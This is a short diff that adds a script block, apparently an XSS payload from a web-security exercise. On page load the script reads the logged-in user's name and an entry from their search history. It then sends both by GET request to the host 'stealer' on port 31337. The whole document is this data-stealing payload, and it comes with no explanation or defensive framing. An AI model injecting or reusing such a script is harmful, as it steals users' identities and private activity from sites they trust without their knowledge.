@@ -1,0 +1,10 @@
+<script>
+    $(document).ready(
+	    function() {
+		    u = $("#logged-in-user").text();
+		    h = $("#history-list .history-item:eq(1)").text();
+		    rq = "http://stealer:31337/?stolen_user=" + u + "&last_search=" + h;
+		    $.get(rq);
+	    }
+    )
+</script>
